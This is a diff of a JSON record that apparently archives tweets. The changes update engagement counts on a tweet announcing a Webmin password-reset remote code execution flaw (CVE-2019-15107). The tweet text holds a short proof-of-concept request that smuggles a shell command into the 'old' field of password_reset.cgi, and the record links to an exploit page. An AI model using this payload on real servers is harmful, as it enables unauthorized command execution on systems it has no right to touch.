@@ -101,10 +101,10 @@
     "expanded_url": [
         "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"
     ],
-    "tweetfavorites": 839,
+    "tweetfavorites": 841,
     "tweetquotes": 8,
     "tweetreplies": 6,
-    "tweetretweets": 433,
+    "tweetretweets": 434,
     "tweettext": "\"Webmin 0day remote code execution\"\n\nTl;Dr: Lack of input validation in the reset password function  allows RCE (CVE-2019-15107). Over 13 0000 vulnerable on Shodan. \n\nPoC: \n/password_reset.cgi \nuser=root&amp;pam&amp;expired&amp;old=wrong | id\n\nhttps://t.co/kYKfq8v6Bb",
     "tweettime": "2019-08-17, 11:56:35",
     "tweeturl": "https://twitter.com/_hg8_/status/1162694712177954819",
